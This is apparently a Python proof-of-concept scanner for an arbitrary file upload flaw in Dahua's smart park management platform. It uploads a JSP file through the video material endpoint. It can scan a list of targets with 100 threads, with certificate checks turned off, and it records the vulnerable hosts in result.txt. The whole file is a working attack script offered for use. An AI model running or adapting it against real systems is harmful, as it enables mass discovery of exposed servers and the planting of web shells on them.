import requests,argparse,sys,re,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """______________  __                 _____________       
___  __ \__  / / /     ___   ____________  /__(_)_____ 
__  / / /_  /_/ /________ | / /  _ \  __  /__  /_  __ \
_  /_/ /_  __  /_/_____/_ |/ //  __/ /_/ / _  / / /_/ /
/_____/ /_/ /_/        _____/ \___/\__,_/  /_/  \____/ 
                                                       """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='大华智慧园区综合管理平台video任意文件上传漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')

def poc(target):
    payload = '/publishing/publishing/material/file/video'
    headers = {
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Content-Length':'804',
        'Content-Type':'multipart/form-data; boundary=dd8f988919484abab3816881c55272a7',
        'Accept-Encoding':'gzip, deflate',
        'Connection':'close',
    }
    data = '--dd8f988919484abab3816881c55272a7\r\nContent-Disposition: form-data; name="Filedata"; filename="Test.jsp"\r\n\r\nTest\r\n--dd8f988919484abab3816881c55272a7\r\nContent-Disposition: form-data; name="Submit"\r\n\r\nsubmit\r\n--dd8f988919484abab3816881c55272a7--'
    try:
        res = requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=10)
        match = re.findall('"VIDEO/(.*?)"',res.text,re.S)[0]
        if res.status_code == 200 and 'data' in res.text:
            print(f'[+]存在漏洞：{target}')
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
        else:
            return False
    except Exception as e:
        return False

if __name__ == '__main__':
    main()